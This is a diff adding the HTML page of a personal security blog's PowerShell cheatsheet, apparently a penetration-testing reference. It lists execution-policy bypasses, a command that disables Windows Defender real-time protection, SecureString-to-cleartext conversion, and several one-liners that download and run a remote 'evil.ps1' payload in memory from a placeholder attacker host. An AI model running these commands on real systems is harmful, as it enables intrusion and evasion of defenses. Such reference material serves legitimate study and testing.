@@ -1,0 +1,267 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Common PowerShell Execution Policy bypass: powershell –ExecutionPolicy bypass powershell –c &lt;cmd&gt; powershell –encodedcommand $env:PSExecutionPolicyPreference=&#34;bypass&#34; *Note: It is NOT a security measure, it is present to prevent user from accidentally executing scripts. Check LanguageMode in current ExecutionContenxt: $ExecutionContext.SessionState.LanguageMode Import a module: Import-Module &lt;modulepath&gt; List commands in a …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="PowerShell Cheatsheet"/>
+  <meta property="og:description" content="Common PowerShell Execution Policy bypass: powershell –ExecutionPolicy bypass powershell –c &lt;cmd&gt; powershell –encodedcommand $env:PSExecutionPolicyPreference=&#34;bypass&#34; *Note: It is NOT a security measure, it is present to prevent user from accidentally executing scripts. Check LanguageMode in current ExecutionContenxt: $ExecutionContext.SessionState.LanguageMode Import a module: Import-Module &lt;modulepath&gt; List commands in a …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/misc/powershell-cheatsheet.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Cheatsheet"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; PowerShell Cheatsheet</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="misc/powershell-cheatsheet">PowerShell Cheatsheet</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#common" title="Common">Common</a></li><li><a class="toc-href" href="#remote-file" title="Remote File">Remote File</a></li><li><a class="toc-href" href="#loop" title="Loop">Loop</a></li></ul></div>
+        </div>
+    <h2 id="common">Common</h2>
+<p>PowerShell Execution Policy bypass:</p>
+<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="err">&ndash;</span><span class="n">ExecutionPolicy</span> <span class="n">bypass</span>
+<span class="n">powershell</span> <span class="err">&ndash;</span><span class="n">c</span> <span class="p">&lt;</span><span class="n">cmd</span><span class="p">&gt;</span>
+<span class="n">powershell</span> <span class="err">&ndash;</span><span class="n">encodedcommand</span>
+<span class="nv">$env:PSExecutionPolicyPreference</span><span class="p">=</span><span class="s2">"bypass"</span>
+</code></pre></div>
+<p>*Note: It is NOT a security measure, it is present to prevent user from accidentally executing scripts.</p>
+<p>Check <code>LanguageMode</code> in current <code>ExecutionContenxt</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
+</code></pre></div>
+<p>Import a module:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">&lt;</span><span class="n">modulepath</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>List commands in a module:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-Command</span> <span class="n">-Module</span> <span class="p">&lt;</span><span class="n">modulename</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>List locally loaded functions:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">ls </span><span class="k">function</span><span class="p">:</span> <span class="c"># Only on Windows</span>
+<span class="nb">Get-Command</span> <span class="n">-CommandType</span> <span class="k">Function</span>
+</code></pre></div>
+<p>Get function content:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-Command</span> <span class="p">&lt;</span><span class="k">function</span> <span class="n">name</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">ScriptBlock</span>
+<span class="p">(</span><span class="nb">Get-Command</span> <span class="p">&lt;</span><span class="k">function</span> <span class="n">name</span><span class="p">&gt;).</span><span class="n">ScriptBlock</span>
+<span class="nv">$Function</span><span class="p">:&lt;</span><span class="k">function</span> <span class="n">name</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Disable Windows Defender real-time protection:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Set-MpPreference</span> <span class="n">-DisablerealtimeMonitoring</span> <span class="nv">$true</span>
+</code></pre></div>
+<p>Escape single quote <code>'</code> in single quote <code>'</code> strings:</p>
+<div class="highlight"><pre><span></span><code> <span class="s1">'this is''nt an emergency'</span> <span class="c"># Double the '</span>
+</code></pre></div>
+<p>Base64-encode a file:</p>
+<div class="highlight"><pre><span></span><code><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(&lt;</span><span class="n">file</span> <span class="n">path</span><span class="p">&gt;))</span>
+</code></pre></div>
+<p>Base64-decode a string:</p>
+<div class="highlight"><pre><span></span><code><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">"&lt;base64 string&gt;"</span><span class="p">))</span>
+</code></pre></div>
+<p>Base64-encode a string:</p>
+<div class="highlight"><pre><span></span><code><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">"&lt;string&gt;"</span><span class="p">))</span>
+</code></pre></div>
+<p>Search files recursively:</p>
+<div class="highlight"><pre><span></span><code>Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force
+</code></pre></div>
+<p>Get file hash:</p>
+<div class="highlight"><pre><span></span><code>Get-FileHash -Algorithm md5
+</code></pre></div>
+<p>Convert SecureString to cleartext string:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nb">New-Object</span> <span class="n">PSCredential</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">).</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
+</code></pre></div>
+<h2 id="remote-file">Remote File</h2>
+<p>Download remote script and execute it in memory:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'https://&lt;remote&gt;/payload.ps1'</span><span class="p">)</span>
+
+<span class="c"># Using Internet Explorer - doesn't always work</span>
+<span class="nv">$ie</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">InternetExplorer</span><span class="p">.</span><span class="n">Application</span><span class="p">;</span><span class="nv">$ie</span><span class="p">.</span><span class="n">visible</span><span class="p">=</span><span class="nv">$False</span><span class="p">;</span><span class="nv">$ie</span><span class="p">.</span><span class="n">navigate</span><span class="p">(</span><span class="s1">'http://&lt;remote&gt;/evil.ps1</span>
+<span class="s1">'</span><span class="p">);</span><span class="nb">sleep </span><span class="n">5</span><span class="p">;</span><span class="nv">$response</span><span class="p">=</span><span class="nv">$ie</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">innerHTML</span><span class="p">;</span><span class="nv">$ie</span><span class="p">.</span><span class="n">quit</span><span class="p">();</span><span class="nb">iex </span><span class="nv">$response</span>
+
+<span class="c"># From PowerShell v3 and onwards</span>
+<span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">'http://&lt;remote&gt;/evil.ps1'</span><span class="p">)</span>
+<span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="n">evil</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
+
+<span class="c"># Using VBScript's Msxml2</span>
+<span class="nv">$h</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-ComObject</span>
+<span class="n">Msxml2</span><span class="p">.</span><span class="n">XMLHTTP</span><span class="p">;</span><span class="nv">$h</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'http://&lt;remote&gt;/evil.ps1'</span><span class="p">,</span><span class="nv">$false</span><span class="p">);</span><span class="nv">$h</span><span class="p">.</span><span class="n">send</span><span class="p">();</span><span class="nb">iex</span>
+<span class="nv">$h</span><span class="p">.</span><span class="n">responseText</span>
+
+<span class="c"># Using .NET</span>
+<span class="nv">$wr</span> <span class="p">=</span> <span class="no">[System.NET.WebRequest]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">"http://&lt;remote&gt;/evil.ps1"</span><span class="p">)</span>
+<span class="nv">$r</span> <span class="p">=</span> <span class="nv">$wr</span><span class="p">.</span><span class="n">GetResponse</span><span class="p">()</span>
+<span class="nb">IEX </span><span class="p">(</span><span class="no">[System.IO.StreamReader]</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">GetResponseStream</span><span class="p">())).</span><span class="n">ReadToEnd</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="loop">Loop</h2>
+<p>Loop on object:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">dnshostname</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="n">-Process</span> <span class="p">{</span><span class="nb">Invoke-CheckLocalAdminAccess</span> <span class="n">-ComputerName</span> <span class="nv">$_</span><span class="p">.</span><span class="n">dnshostname</span> <span class="n">-Verbose</span><span class="p">}</span>
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
